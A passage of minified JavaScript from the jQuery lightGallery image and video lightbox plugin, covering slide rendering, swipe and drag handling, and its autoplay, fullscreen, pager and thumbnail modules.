        return this.el = e, this.$el = t(e), this.s = t.extend({}, s, n), this.modules = {}, this.lGalleryOn = !1, this.lgBusy = !1, this.hideBartimeout = !1, this.isTouch = "ontouchstart" in i.documentElement, this.s.slideEndAnimatoin && (this.s.hideControlOnEnd = !1), this.s.dynamic ? this.$items = this.s.dynamicEl : "this" === this.s.selector ? this.$items = this.$el : "" !== this.s.selector ? this.$items = this.$el.find(t(this.s.selector)) : this.$items = this.$el.children(), this.$slide = "", this.$outer = "", this.init(), this
    }

    var s = {
        mode: "lg-slide",
        cssEasing: "cubic-bezier(0.25, 0, 0.25, 1)",
        easing: "linear",
        speed: 600,
        height: "100%",
        width: "100%",
        addClass: "",
        startClass: "lg-start-zoom",
        backdropDuration: 150,
        hideBarsDelay: 6e3,
        useLeft: !1,
        closable: !0,
        loop: !0,
        escKey: !0,
        keyPress: !0,
        controls: !0,
        slideEndAnimatoin: !0,
        hideControlOnEnd: !1,
        mousewheel: !0,
        appendSubHtmlTo: ".lg-sub-html",
        preload: 1,
        showAfterLoad: !0,
        selector: "",
        nextHtml: "",
        prevHtml: "",
        index: !1,
        iframeMaxWidth: "100%",
        download: !0,
        counter: !0,
        appendCounterTo: ".lg-toolbar",
        swipeThreshold: 50,
        enableSwipe: !0,
        enableDrag: !0,
        dynamic: !1,
        dynamicEl: [],
        galleryId: 1
    };
    o.prototype.init = function () {
        var i = this;
        i.s.preload > i.$items.length && (i.s.preload = i.$items.length);
        var n = e.location.hash;
        n.indexOf("lg=" + this.s.galleryId) > 0 && (i.index = parseInt(n.split("&slide=")[1], 10), t("body").addClass("lg-from-hash"), t("body").hasClass("lg-on") || setTimeout((function () {
            i.build(i.index), t("body").addClass("lg-on")
        }))), i.s.dynamic ? (i.$el.trigger("onBeforeOpen.lg"), i.index = i.s.index || 0, t("body").hasClass("lg-on") || setTimeout((function () {
            i.build(i.index), t("body").addClass("lg-on")
        }))) : i.$items.on("click.lgcustom", (function (e) {
            try {
                e.preventDefault(), e.preventDefault()
            } catch (t) {
                e.returnValue = !1
            }
            i.$el.trigger("onBeforeOpen.lg"), i.index = i.s.index || i.$items.index(this), t("body").hasClass("lg-on") || (i.build(i.index), t("body").addClass("lg-on"))
        }))
    }, o.prototype.build = function (e) {
        var i = this;
        i.structure(), t.each(t.fn.lightGallery.modules, (function (e) {
            i.modules[e] = new t.fn.lightGallery.modules[e](i.el)
        })), i.slide(e, !1, !1), i.s.keyPress && i.keyPress(), i.$items.length > 1 && (i.arrow(), setTimeout((function () {
            i.enableDrag(), i.enableSwipe()
        }), 50), i.s.mousewheel && i.mousewheel()), i.counter(), i.closeGallery(), i.$el.trigger("onAfterOpen.lg"), i.$outer.on("mousemove.lg click.lg touchstart.lg", (function () {
            i.$outer.removeClass("lg-hide-items"), clearTimeout(i.hideBartimeout), i.hideBartimeout = setTimeout((function () {
                i.$outer.addClass("lg-hide-items")
            }), i.s.hideBarsDelay)
        }))
    }, o.prototype.structure = function () {
        var i, n = "", o = "", s = 0, r = "", a = this;
        for (t("body").append('<div class="lg-backdrop"></div>'), t(".lg-backdrop").css("transition-duration", this.s.backdropDuration + "ms"), s = 0; s < this.$items.length; s++) n += '<div class="lg-item"></div>';
        if (this.s.controls && this.$items.length > 1 && (o = '<div class="lg-actions"><div class="lg-prev lg-icon">' + this.s.prevHtml + '</div><div class="lg-next lg-icon">' + this.s.nextHtml + "</div></div>"), ".lg-sub-html" === this.s.appendSubHtmlTo && (r = '<div class="lg-sub-html"></div>'), i = '<div class="lg-outer ' + this.s.addClass + " " + this.s.startClass + '"><div class="lg" style="width:' + this.s.width + "; height:" + this.s.height + '"><div class="lg-inner">' + n + '</div><div class="lg-toolbar group"><span class="lg-close lg-icon"></span></div>' + o + r + "</div></div>", t("body").append(i), this.$outer = t(".lg-outer"), this.$slide = this.$outer.find(".lg-item"), this.s.useLeft ? (this.$outer.addClass("lg-use-left"), this.s.mode = "lg-slide") : this.$outer.addClass("lg-use-css3"), a.setTop(), t(e).on("resize.lg orientationchange.lg", (function () {
            setTimeout((function () {
                a.setTop()
            }), 100)
        })), this.$slide.eq(this.index).addClass("lg-current"), this.doCss() ? this.$outer.addClass("lg-css3") : (this.$outer.addClass("lg-css"), this.s.speed = 0), this.$outer.addClass(this.s.mode), this.s.enableDrag && this.$items.length > 1 && this.$outer.addClass("lg-grab"), this.s.showAfterLoad && this.$outer.addClass("lg-show-after-load"), this.doCss()) {
            var l = this.$outer.find(".lg-inner");
            l.css("transition-timing-function", this.s.cssEasing), l.css("transition-duration", this.s.speed + "ms")
        }
        t(".lg-backdrop").addClass("in"), setTimeout((function () {
            a.$outer.addClass("lg-visible")
        }), this.s.backdropDuration), this.s.download && this.$outer.find(".lg-toolbar").append('<a id="lg-download" target="_blank" download class="lg-download lg-icon"></a>'), this.prevScrollTop = t(e).scrollTop()
    }, o.prototype.setTop = function () {
        if ("100%" !== this.s.height) {
            var i = t(e).height(), n = (i - parseInt(this.s.height, 10)) / 2, o = this.$outer.find(".lg");
            i >= parseInt(this.s.height, 10) ? o.css("top", n + "px") : o.css("top", "0px")
        }
    }, o.prototype.doCss = function () {
        return !!function () {
            var t = ["transition", "MozTransition", "WebkitTransition", "OTransition", "msTransition", "KhtmlTransition"],
                e = i.documentElement, n = 0;
            for (n = 0; n < t.length; n++) if (t[n] in e.style) return !0
        }()
    }, o.prototype.isVideo = function (t, e) {
        var i;
        if (i = this.s.dynamic ? this.s.dynamicEl[e].html : this.$items.eq(e).attr("data-html"), !t && i) return {html5: !0};
        var n = t.match(/\/\/(?:www\.)?youtu(?:\.be|be\.com)\/(?:watch\?v=|embed\/)?([a-z0-9\-\_\%]+)/i),
            o = t.match(/\/\/(?:www\.)?vimeo.com\/([0-9a-z\-_]+)/i),
            s = t.match(/\/\/(?:www\.)?dai.ly\/([0-9a-z\-_]+)/i);
        return n ? {youtube: n} : o ? {vimeo: o} : s ? {dailymotion: s} : void 0
    }, o.prototype.counter = function () {
        this.s.counter && t(this.s.appendCounterTo).append('<div id="lg-counter"><span id="lg-counter-current">' + (parseInt(this.index, 10) + 1) + '</span> / <span id="lg-counter-all">' + this.$items.length + "</span></div>")
    }, o.prototype.addHtml = function (e) {
        var i, n = null;
        if (this.s.dynamic ? this.s.dynamicEl[e].subHtmlUrl ? i = this.s.dynamicEl[e].subHtmlUrl : n = this.s.dynamicEl[e].subHtml : this.$items.eq(e).attr("data-sub-html-url") ? i = this.$items.eq(e).attr("data-sub-html-url") : n = this.$items.eq(e).attr("data-sub-html"), !i) if (null != n) {
            var o = n.substring(0, 1);
            n = "." === o || "#" === o ? t(n).html() : n
        } else n = "";
        ".lg-sub-html" === this.s.appendSubHtmlTo ? i ? this.$outer.find(this.s.appendSubHtmlTo).load(i) : this.$outer.find(this.s.appendSubHtmlTo).html(n) : i ? this.$slide.eq(e).load(i) : this.$slide.eq(e).append(n), null != n && ("" === n ? this.$outer.find(this.s.appendSubHtmlTo).addClass("lg-empty-html") : this.$outer.find(this.s.appendSubHtmlTo).removeClass("lg-empty-html")), this.$el.trigger("onAfterAppendSubHtml.lg", [e])
    }, o.prototype.preload = function (t) {
        var e = 1, i = 1;
        for (e = 1; e <= this.s.preload && !(e >= this.$items.length - t); e++) this.loadContent(t + e, !1, 0);
        for (i = 1; i <= this.s.preload && !(0 > t - i); i++) this.loadContent(t - i, !1, 0)
    }, o.prototype.loadContent = function (i, n, o) {
        var s, r, a, l, c, d, u = this, h = !1, p = function (i) {
            for (var n = [], o = [], s = 0; s < i.length; s++) {
                var a = i[s].split(" ");
                "" === a[0] && a.splice(0, 1), o.push(a[0]), n.push(a[1])
            }
            for (var l = t(e).width(), c = 0; c < n.length; c++) if (parseInt(n[c], 10) > l) {
                r = o[c];
                break
            }
        };
        if (u.s.dynamic) {
            if (u.s.dynamicEl[i].poster && (h = !0, a = u.s.dynamicEl[i].poster), d = u.s.dynamicEl[i].html, r = u.s.dynamicEl[i].src, u.s.dynamicEl[i].responsive) p(u.s.dynamicEl[i].responsive.split(","));
            l = u.s.dynamicEl[i].srcset, c = u.s.dynamicEl[i].sizes
        } else {
            if (u.$items.eq(i).attr("data-poster") && (h = !0, a = u.$items.eq(i).attr("data-poster")), d = u.$items.eq(i).attr("data-html"), r = u.$items.eq(i).attr("href") || u.$items.eq(i).attr("data-src"), u.$items.eq(i).attr("data-responsive")) p(u.$items.eq(i).attr("data-responsive").split(","));
            l = u.$items.eq(i).attr("data-srcset"), c = u.$items.eq(i).attr("data-sizes")
        }
        var f = !1;
        u.s.dynamic ? u.s.dynamicEl[i].iframe && (f = !0) : "true" === u.$items.eq(i).attr("data-iframe") && (f = !0);
        var g = u.isVideo(r, i);
        if (!u.$slide.eq(i).hasClass("lg-loaded")) {
            if (f) u.$slide.eq(i).prepend('<div class="lg-video-cont" style="max-width:' + u.s.iframeMaxWidth + '"><div class="lg-video"><iframe class="lg-object" frameborder="0" src="' + r + '"  allowfullscreen="true"></iframe></div></div>'); else if (h) {
                var m;
                m = g && g.youtube ? "lg-has-youtube" : g && g.vimeo ? "lg-has-vimeo" : "lg-has-html5", u.$slide.eq(i).prepend('<div class="lg-video-cont ' + m + ' "><div class="lg-video"><span class="lg-video-play"></span><img class="lg-object lg-has-poster" src="' + a + '" /></div></div>')
            } else g ? (u.$slide.eq(i).prepend('<div class="lg-video-cont "><div class="lg-video"></div></div>'), u.$el.trigger("hasVideo.lg", [i, r, d])) : u.$slide.eq(i).prepend('<div class="lg-img-wrap"><img class="lg-object lg-image" src="' + r + '" /></div>');
            if (u.$el.trigger("onAferAppendSlide.lg", [i]), s = u.$slide.eq(i).find(".lg-object"), c && s.attr("sizes", c), l) {
                s.attr("srcset", l);
                try {
                    picturefill({elements: [s[0]]})
                } catch (t) {
                    console.error("Make sure you have included Picturefill version 2")
                }
            }
            ".lg-sub-html" !== this.s.appendSubHtmlTo && u.addHtml(i), u.$slide.eq(i).addClass("lg-loaded")
        }
        u.$slide.eq(i).find(".lg-object").on("load.lg error.lg", (function () {
            var e = 0;
            o && !t("body").hasClass("lg-from-hash") && (e = o), setTimeout((function () {
                u.$slide.eq(i).addClass("lg-complete"), u.$el.trigger("onSlideItemLoad.lg", [i, o || 0])
            }), e)
        })), g && g.html5 && !h && u.$slide.eq(i).addClass("lg-complete"), !0 === n && (u.$slide.eq(i).hasClass("lg-complete") ? u.preload(i) : u.$slide.eq(i).find(".lg-object").on("load.lg error.lg", (function () {
            u.preload(i)
        })))
    }, o.prototype.slide = function (e, i, n) {
        var o = this.$outer.find(".lg-current").index(), s = this;
        if (!s.lGalleryOn || o !== e) {
            var r = this.$slide.length, a = s.lGalleryOn ? this.s.speed : 0, l = !1, c = !1;
            if (!s.lgBusy) {
                if (this.$el.trigger("onBeforeSlide.lg", [o, e, i, n]), s.lgBusy = !0, clearTimeout(s.hideBartimeout), ".lg-sub-html" === this.s.appendSubHtmlTo && setTimeout((function () {
                    s.addHtml(e)
                }), a), this.arrowDisable(e), i) {
                    var d = e - 1, u = e + 1;
                    (0 === e && o === r - 1 || e === r - 1 && 0 === o) && (u = 0, d = r - 1), this.$slide.removeClass("lg-prev-slide lg-current lg-next-slide"), s.$slide.eq(d).addClass("lg-prev-slide"), s.$slide.eq(u).addClass("lg-next-slide"), s.$slide.eq(e).addClass("lg-current")
                } else s.$outer.addClass("lg-no-trans"), this.$slide.removeClass("lg-prev-slide lg-next-slide"), o > e ? (c = !0, 0 !== e || o !== r - 1 || n || (c = !1, l = !0)) : e > o && (l = !0, e !== r - 1 || 0 !== o || n || (c = !0, l = !1)), c ? (this.$slide.eq(e).addClass("lg-prev-slide"), this.$slide.eq(o).addClass("lg-next-slide")) : l && (this.$slide.eq(e).addClass("lg-next-slide"), this.$slide.eq(o).addClass("lg-prev-slide")), setTimeout((function () {
                    s.$slide.removeClass("lg-current"), s.$slide.eq(e).addClass("lg-current"), s.$outer.removeClass("lg-no-trans")
                }), 50);
                var h;
                if (s.lGalleryOn ? (setTimeout((function () {
                    s.loadContent(e, !0, 0)
                }), this.s.speed + 50), setTimeout((function () {
                    s.lgBusy = !1, s.$el.trigger("onAfterSlide.lg", [o, e, i, n])
                }), this.s.speed)) : (s.loadContent(e, !0, s.s.backdropDuration), s.lgBusy = !1, s.$el.trigger("onAfterSlide.lg", [o, e, i, n])), this.s.download) h = s.s.dynamic ? s.s.dynamicEl[e].downloadUrl || s.s.dynamicEl[e].src : s.$items.eq(e).attr("data-download-url") || s.$items.eq(e).attr("href") || s.$items.eq(e).attr("data-src"), t("#lg-download").attr("href", h);
                s.lGalleryOn = !0, this.s.counter && t("#lg-counter-current").text(e + 1)
            }
        }
    }, o.prototype.goToNextSlide = function (t) {
        var e = this;
        e.lgBusy || (e.index + 1 < e.$slide.length ? (e.index++, e.$el.trigger("onBeforeNextSlide.lg", [e.index]), e.slide(e.index, t, !1)) : e.s.loop ? (e.index = 0, e.$el.trigger("onBeforeNextSlide.lg", [e.index]), e.slide(e.index, t, !1)) : e.s.slideEndAnimatoin && (e.$outer.addClass("lg-right-end"), setTimeout((function () {
            e.$outer.removeClass("lg-right-end")
        }), 400)))
    }, o.prototype.goToPrevSlide = function (t) {
        var e = this;
        e.lgBusy || (e.index > 0 ? (e.index--, e.$el.trigger("onBeforePrevSlide.lg", [e.index, t]), e.slide(e.index, t, !1)) : e.s.loop ? (e.index = e.$items.length - 1, e.$el.trigger("onBeforePrevSlide.lg", [e.index, t]), e.slide(e.index, t, !1)) : e.s.slideEndAnimatoin && (e.$outer.addClass("lg-left-end"), setTimeout((function () {
            e.$outer.removeClass("lg-left-end")
        }), 400)))
    }, o.prototype.keyPress = function () {
        var i = this;
        this.$items.length > 1 && t(e).on("keyup.lg", (function (t) {
            i.$items.length > 1 && (37 === t.keyCode && (t.preventDefault(), i.goToPrevSlide()), 39 === t.keyCode && (t.preventDefault(), i.goToNextSlide()))
        })), t(e).on("keydown.lg", (function (t) {
            !0 === i.s.escKey && 27 === t.keyCode && (t.preventDefault(), i.$outer.hasClass("lg-thumb-open") ? i.$outer.removeClass("lg-thumb-open") : i.destroy())
        }))
    }, o.prototype.arrow = function () {
        var t = this;
        this.$outer.find(".lg-prev").on("click.lg", (function () {
            t.goToPrevSlide()
        })), this.$outer.find(".lg-next").on("click.lg", (function () {
            t.goToNextSlide()
        }))
    }, o.prototype.arrowDisable = function (t) {
        !this.s.loop && this.s.hideControlOnEnd && (t + 1 < this.$slide.length ? this.$outer.find(".lg-next").removeAttr("disabled").removeClass("disabled") : this.$outer.find(".lg-next").attr("disabled", "disabled").addClass("disabled"), t > 0 ? this.$outer.find(".lg-prev").removeAttr("disabled").removeClass("disabled") : this.$outer.find(".lg-prev").attr("disabled", "disabled").addClass("disabled"))
    }, o.prototype.setTranslate = function (t, e, i) {
        this.s.useLeft ? t.css("left", e) : t.css({transform: "translate3d(" + e + "px, " + i + "px, 0px)"})
    }, o.prototype.touchMove = function (e, i) {
        var n = i - e;
        this.$outer.addClass("lg-dragging"), this.setTranslate(this.$slide.eq(this.index), n, 0), this.setTranslate(t(".lg-prev-slide"), -this.$slide.eq(this.index).width() + n, 0), this.setTranslate(t(".lg-next-slide"), this.$slide.eq(this.index).width() + n, 0)
    }, o.prototype.touchEnd = function (t) {
        var e = this;
        "lg-slide" !== e.s.mode && e.$outer.addClass("lg-slide"), this.$slide.not(".lg-current, .lg-prev-slide, .lg-next-slide").css("opacity", "0"), setTimeout((function () {
            e.$outer.removeClass("lg-dragging"), 0 > t && Math.abs(t) > e.s.swipeThreshold ? e.goToNextSlide(!0) : t > 0 && Math.abs(t) > e.s.swipeThreshold ? e.goToPrevSlide(!0) : Math.abs(t) < 5 && e.$el.trigger("onSlideClick.lg"), e.$slide.removeAttr("style")
        })), setTimeout((function () {
            e.$outer.hasClass("lg-dragging") || "lg-slide" === e.s.mode || e.$outer.removeClass("lg-slide")
        }), e.s.speed + 100)
    }, o.prototype.enableSwipe = function () {
        var t = this, e = 0, i = 0, n = !1;
        t.s.enableSwipe && t.isTouch && t.doCss() && (t.$slide.on("touchstart.lg", (function (i) {
            t.$outer.hasClass("lg-zoomed") || t.lgBusy || (i.preventDefault(), t.manageSwipeClass(), e = i.originalEvent.targetTouches[0].pageX)
        })), t.$slide.on("touchmove.lg", (function (o) {
            t.$outer.hasClass("lg-zoomed") || (o.preventDefault(), i = o.originalEvent.targetTouches[0].pageX, t.touchMove(e, i), n = !0)
        })), t.$slide.on("touchend.lg", (function () {
            t.$outer.hasClass("lg-zoomed") || (n ? (n = !1, t.touchEnd(i - e)) : t.$el.trigger("onSlideClick.lg"))
        })))
    }, o.prototype.enableDrag = function () {
        var i = this, n = 0, o = 0, s = !1, r = !1;
        i.s.enableDrag && !i.isTouch && i.doCss() && (i.$slide.on("mousedown.lg", (function (e) {
            i.$outer.hasClass("lg-zoomed") || (t(e.target).hasClass("lg-object") || t(e.target).hasClass("lg-video-play")) && (e.preventDefault(), i.lgBusy || (i.manageSwipeClass(), n = e.pageX, s = !0, i.$outer.scrollLeft += 1, i.$outer.scrollLeft -= 1, i.$outer.removeClass("lg-grab").addClass("lg-grabbing"), i.$el.trigger("onDragstart.lg")))
        })), t(e).on("mousemove.lg", (function (t) {
            s && (r = !0, o = t.pageX, i.touchMove(n, o), i.$el.trigger("onDragmove.lg"))
        })), t(e).on("mouseup.lg", (function (e) {
            r ? (r = !1, i.touchEnd(o - n), i.$el.trigger("onDragend.lg")) : (t(e.target).hasClass("lg-object") || t(e.target).hasClass("lg-video-play")) && i.$el.trigger("onSlideClick.lg"), s && (s = !1, i.$outer.removeClass("lg-grabbing").addClass("lg-grab"))
        })))
    }, o.prototype.manageSwipeClass = function () {
        var t = this.index + 1, e = this.index - 1, i = this.$slide.length;
        this.s.loop && (0 === this.index ? e = i - 1 : this.index === i - 1 && (t = 0)), this.$slide.removeClass("lg-next-slide lg-prev-slide"), e > -1 && this.$slide.eq(e).addClass("lg-prev-slide"), this.$slide.eq(t).addClass("lg-next-slide")
    }, o.prototype.mousewheel = function () {
        var t = this;
        t.$outer.on("mousewheel.lg", (function (e) {
            e.deltaY && (e.deltaY > 0 ? t.goToPrevSlide() : t.goToNextSlide(), e.preventDefault())
        }))
    }, o.prototype.closeGallery = function () {
        var e = this, i = !1;
        this.$outer.find(".lg-close").on("click.lg", (function () {
            e.destroy()
        })), e.s.closable && (e.$outer.on("mousedown.lg", (function (e) {
            i = !!(t(e.target).is(".lg-outer") || t(e.target).is(".lg-item ") || t(e.target).is(".lg-img-wrap"))
        })), e.$outer.on("mouseup.lg", (function (n) {
            (t(n.target).is(".lg-outer") || t(n.target).is(".lg-item ") || t(n.target).is(".lg-img-wrap") && i) && (e.$outer.hasClass("lg-dragging") || e.destroy())
        })))
    }, o.prototype.destroy = function (i) {
        var n = this;
        n.$el.trigger("onBeforeClose.lg"), t(e).scrollTop(n.prevScrollTop), i && (this.$items.off("click.lg click.lgcustom"), t.removeData(n.el, "lightGallery")), this.$el.off(".lg.tm"), t.each(t.fn.lightGallery.modules, (function (t) {
            n.modules[t] && n.modules[t].destroy()
        })), this.lGalleryOn = !1, clearTimeout(n.hideBartimeout), this.hideBartimeout = !1, t(e).off(".lg"), t("body").removeClass("lg-on lg-from-hash"), n.$outer && n.$outer.removeClass("lg-visible"), t(".lg-backdrop").removeClass("in"), setTimeout((function () {
            n.$outer && n.$outer.remove(), t(".lg-backdrop").remove(), n.$el.trigger("onCloseAfter.lg")
        }), n.s.backdropDuration + 50)
    }, t.fn.lightGallery = function (e) {
        return this.each((function () {
            if (t.data(this, "lightGallery")) try {
                t(this).data("lightGallery").init()
            } catch (t) {
                console.error("lightGallery has not initiated properly")
            } else t.data(this, "lightGallery", new o(this, e))
        }))
    }, t.fn.lightGallery.modules = {}
}(jQuery, window, document), function (t, e, i, n) {
    "use strict";
    var o = {
        autoplay: !1,
        pause: 5e3,
        progressBar: !0,
        fourceAutoplay: !1,
        autoplayControls: !0,
        appendAutoplayControlsTo: ".lg-toolbar"
    }, s = function (e) {
        return this.core = t(e).data("lightGallery"), this.$el = t(e), !(this.core.$items.length < 2) && (this.core.s = t.extend({}, o, this.core.s), this.interval = !1, this.fromAuto = !0, this.canceledOnTouch = !1, this.fourceAutoplayTemp = this.core.s.fourceAutoplay, this.core.doCss() || (this.core.s.progressBar = !1), this.init(), this)
    };
    s.prototype.init = function () {
        var t = this;
        t.core.s.autoplayControls && t.controls(), t.core.s.progressBar && t.core.$outer.find(".lg").append('<div class="lg-progress-bar"><div class="lg-progress"></div></div>'), t.progress(), t.core.s.autoplay && t.startlAuto(), t.$el.on("onDragstart.lg.tm touchstart.lg.tm", (function () {
            t.interval && (t.cancelAuto(), t.canceledOnTouch = !0)
        })), t.$el.on("onDragend.lg.tm touchend.lg.tm onSlideClick.lg.tm", (function () {
            !t.interval && t.canceledOnTouch && (t.startlAuto(), t.canceledOnTouch = !1)
        }))
    }, s.prototype.progress = function () {
        var t, e, i = this;
        i.$el.on("onBeforeSlide.lg.tm", (function () {
            i.core.s.progressBar && i.fromAuto && (t = i.core.$outer.find(".lg-progress-bar"), e = i.core.$outer.find(".lg-progress"), i.interval && (e.removeAttr("style"), t.removeClass("lg-start"), setTimeout((function () {
                e.css("transition", "width " + (i.core.s.speed + i.core.s.pause) + "ms ease 0s"), t.addClass("lg-start")
            }), 20))), i.fromAuto || i.core.s.fourceAutoplay || i.cancelAuto(), i.fromAuto = !1
        }))
    }, s.prototype.controls = function () {
        var e = this;
        t(this.core.s.appendAutoplayControlsTo).append('<span class="lg-autoplay-button lg-icon"></span>'), e.core.$outer.find(".lg-autoplay-button").on("click.lg", (function () {
            t(e.core.$outer).hasClass("lg-show-autoplay") ? (e.cancelAuto(), e.core.s.fourceAutoplay = !1) : e.interval || (e.startlAuto(), e.core.s.fourceAutoplay = e.fourceAutoplayTemp)
        }))
    }, s.prototype.startlAuto = function () {
        var t = this;
        t.core.$outer.find(".lg-progress").css("transition", "width " + (t.core.s.speed + t.core.s.pause) + "ms ease 0s"), t.core.$outer.addClass("lg-show-autoplay"), t.core.$outer.find(".lg-progress-bar").addClass("lg-start"), t.interval = setInterval((function () {
            t.core.index + 1 < t.core.$items.length ? t.core.index = t.core.index : t.core.index = -1, t.core.index++, t.fromAuto = !0, t.core.slide(t.core.index, !1, !1)
        }), t.core.s.speed + t.core.s.pause)
    }, s.prototype.cancelAuto = function () {
        clearInterval(this.interval), this.interval = !1, this.core.$outer.find(".lg-progress").removeAttr("style"), this.core.$outer.removeClass("lg-show-autoplay"), this.core.$outer.find(".lg-progress-bar").removeClass("lg-start")
    }, s.prototype.destroy = function () {
        this.cancelAuto(), this.core.$outer.find(".lg-progress-bar").remove()
    }, t.fn.lightGallery.modules.autoplay = s
}(jQuery, window, document), function (t, e, i, n) {
    "use strict";
    var o = {fullScreen: !0}, s = function (e) {
        return this.core = t(e).data("lightGallery"), this.$el = t(e), this.core.s = t.extend({}, o, this.core.s), this.init(), this
    };
    s.prototype.init = function () {
        var t = "";
        if (this.core.s.fullScreen) {
            if (!(i.fullscreenEnabled || i.webkitFullscreenEnabled || i.mozFullScreenEnabled || i.msFullscreenEnabled)) return;
            t = '<span class="lg-fullscreen lg-icon"></span>', this.core.$outer.find(".lg-toolbar").append(t), this.fullScreen()
        }
    }, s.prototype.reuestFullscreen = function () {
        var t = i.documentElement;
        t.requestFullscreen ? t.requestFullscreen() : t.msRequestFullscreen ? t.msRequestFullscreen() : t.mozRequestFullScreen ? t.mozRequestFullScreen() : t.webkitRequestFullscreen && t.webkitRequestFullscreen()
    }, s.prototype.exitFullscreen = function () {
        i.exitFullscreen ? i.exitFullscreen() : i.msExitFullscreen ? i.msExitFullscreen() : i.mozCancelFullScreen ? i.mozCancelFullScreen() : i.webkitExitFullscreen && i.webkitExitFullscreen()
    }, s.prototype.fullScreen = function () {
        var e = this;
        t(i).on("fullscreenchange.lg webkitfullscreenchange.lg mozfullscreenchange.lg MSFullscreenChange.lg", (function () {
            e.core.$outer.toggleClass("lg-fullscreen-on")
        })), this.core.$outer.find(".lg-fullscreen").on("click.lg", (function () {
            i.fullscreenElement || i.mozFullScreenElement || i.webkitFullscreenElement || i.msFullscreenElement ? e.exitFullscreen() : e.reuestFullscreen()
        }))
    }, s.prototype.destroy = function () {
        this.exitFullscreen(), t(i).off("fullscreenchange.lg webkitfullscreenchange.lg mozfullscreenchange.lg MSFullscreenChange.lg")
    }, t.fn.lightGallery.modules.fullscreen = s
}(jQuery, window, document), function (t, e, i, n) {
    "use strict";
    var o = {pager: !1}, s = function (e) {
        return this.core = t(e).data("lightGallery"), this.$el = t(e), this.core.s = t.extend({}, o, this.core.s), this.core.s.pager && this.core.$items.length > 1 && this.init(), this
    };
    s.prototype.init = function () {
        var e, i, n, o = this, s = "";
        if (o.core.$outer.find(".lg").append('<div class="lg-pager-outer"></div>'), o.core.s.dynamic) for (var r = 0; r < o.core.s.dynamicEl.length; r++) s += '<span class="lg-pager-cont"> <span class="lg-pager"></span><div class="lg-pager-thumb-cont"><span class="lg-caret"></span> <img src="' + o.core.s.dynamicEl[r].thumb + '" /></div></span>'; else o.core.$items.each((function () {
            s += o.core.s.exThumbImage ? '<span class="lg-pager-cont"> <span class="lg-pager"></span><div class="lg-pager-thumb-cont"><span class="lg-caret"></span> <img src="' + t(this).attr(o.core.s.exThumbImage) + '" /></div></span>' : '<span class="lg-pager-cont"> <span class="lg-pager"></span><div class="lg-pager-thumb-cont"><span class="lg-caret"></span> <img src="' + t(this).find("img").attr("src") + '" /></div></span>'
        }));
        (i = o.core.$outer.find(".lg-pager-outer")).html(s), (e = o.core.$outer.find(".lg-pager-cont")).on("click.lg touchend.lg", (function () {
            var e = t(this);
            o.core.index = e.index(), o.core.slide(o.core.index, !1, !1)
        })), i.on("mouseover.lg", (function () {
            clearTimeout(n), i.addClass("lg-pager-hover")
        })), i.on("mouseout.lg", (function () {
            n = setTimeout((function () {
                i.removeClass("lg-pager-hover")
            }))
        })), o.core.$el.on("onBeforeSlide.lg.tm", (function (t, i, n) {
            e.removeClass("lg-pager-active"), e.eq(n).addClass("lg-pager-active")
        }))
    }, s.prototype.destroy = function () {
    }, t.fn.lightGallery.modules.pager = s
}(jQuery, window, document), function (t, e, i, n) {
    "use strict";
    var o = {
        thumbnail: !0,
        animateThumb: !0,
        currentPagerPosition: "middle",
        thumbWidth: 100,
        thumbContHeight: 100,
        thumbMargin: 5,
        exThumbImage: !1,
        showThumbByDefault: !0,
        toogleThumb: !0,
        pullCaptionUp: !0,
        enableThumbDrag: !0,
        enableThumbSwipe: !0,
        swipeThreshold: 50,
        loadYoutubeThumbnail: !0,
        youtubeThumbSize: 1,
        loadVimeoThumbnail: !0,
        vimeoThumbSize: "thumbnail_small",
        loadDailymotionThumbnail: !0
    }, s = function (e) {
        return this.core = t(e).data("lightGallery"), this.core.s = t.extend({}, o, this.core.s), this.$el = t(e), this.$thumbOuter = null, this.thumbOuterWidth = 0, this.thumbTotalWidth = this.core.$items.length * (this.core.s.thumbWidth + this.core.s.thumbMargin), this.thumbIndex = this.core.index, this.left = 0, this.init(), this
    };
    s.prototype.init = function () {
        this.core.s.thumbnail && this.core.$items.length > 1 && (this.core.s.showThumbByDefault && this.core.$outer.addClass("lg-thumb-open"), this.core.s.pullCaptionUp && this.core.$outer.addClass("lg-pull-caption-up"), this.build(), this.core.s.animateThumb ? (this.core.s.enableThumbDrag && !this.core.isTouch && this.core.doCss() && this.enableThumbDrag(), this.core.s.enableThumbSwipe && this.core.isTouch && this.core.doCss() && this.enableThumbSwipe(), this.thumbClickable = !1) : this.thumbClickable = !0, this.toogle(), this.thumbkeyPress())
    }, s.prototype.build = function () {
        function i(t, e, i) {
            var n, a = o.core.isVideo(t, i) || {}, l = "";
            a.youtube || a.vimeo || a.dailymotion ? a.youtube ? n = o.core.s.loadYoutubeThumbnail ? "//img.youtube.com/vi/" + a.youtube[1] + "/" + o.core.s.youtubeThumbSize + ".jpg" : e : a.vimeo ? o.core.s.loadVimeoThumbnail ? (n = "//i.vimeocdn.com/video/error_" + r + ".jpg", l = a.vimeo[1]) : n = e : a.dailymotion && (n = o.core.s.loadDailymotionThumbnail ? "//www.dailymotion.com/thumbnail/video/" + a.dailymotion[1] : e) : n = e, s += '<div data-vimeo-id="' + l + '" class="lg-thumb-item" style="width:' + o.core.s.thumbWidth + "px; margin-right: " + o.core.s.thumbMargin + 'px"><img src="' + n + '" /></div>', l = ""
        }

        var n, o = this, s = "", r = "";
        switch (this.core.s.vimeoThumbSize) {
            case"thumbnail_large":
                r = "640";
                break;
            case"thumbnail_medium":
                r = "200x150";
                break;
            case"thumbnail_small":
                r = "100x75"
        }
        if (o.core.$outer.addClass("lg-has-thumb"), o.core.$outer.find(".lg").append('<div class="lg-thumb-outer"><div class="lg-thumb group"></div></div>'), o.$thumbOuter = o.core.$outer.find(".lg-thumb-outer"), o.thumbOuterWidth = o.$thumbOuter.width(), o.core.s.animateThumb && o.core.$outer.find(".lg-thumb").css({
            width: o.thumbTotalWidth + "px",
            position: "relative"
        }), this.core.s.animateThumb && o.$thumbOuter.css("height", o.core.s.thumbContHeight + "px"), o.core.s.dynamic) for (var a = 0; a < o.core.s.dynamicEl.length; a++) i(o.core.s.dynamicEl[a].src, o.core.s.dynamicEl[a].thumb, a); else o.core.$items.each((function (e) {
            o.core.s.exThumbImage ? i(t(this).attr("href") || t(this).attr("data-src"), t(this).attr(o.core.s.exThumbImage), e) : i(t(this).attr("href") || t(this).attr("data-src"), t(this).find("img").attr("src"), e)
        }));
        o.core.$outer.find(".lg-thumb").html(s), (n = o.core.$outer.find(".lg-thumb-item")).each((function () {
            var e = t(this), i = e.attr("data-vimeo-id");
